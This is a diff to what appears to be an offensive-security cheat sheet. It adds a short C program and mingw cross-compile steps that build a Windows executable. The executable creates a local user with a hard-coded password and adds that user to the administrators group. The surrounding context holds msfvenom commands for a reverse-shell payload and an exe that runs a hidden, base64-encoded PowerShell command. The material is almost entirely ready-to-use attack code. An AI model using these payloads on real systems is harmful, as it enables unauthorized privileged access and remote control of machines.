@@ -38,3 +38,22 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f psh -o shel
   msfvenom -p windows/exec CMD='powershell -nop -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"NABlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkA
   G0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAAdABoAGUAbQBpAHMAIAAvAGEAZABkACIA\")))"' -f exe -o adduser.exe
 ```
+
+### **Malicious C binary creation (add user to admins)**
+
+```c
+#include <stdlib.h>
+int main(void) {
+  system("net user misthos password123! /add");
+  system("net localgroup administrators misthos /add");
+  return 0;
+}
+```
+
+**Cross-compile for Windows:**
+
+```bash
+sudo apt install mingw-w64
+x86_64-w64-mingw32-gcc malicious.c -o malicious.exe    # 64-bit
+i686-w64-mingw32-gcc malicious.c -o malicious.exe      # 32-bit
+```
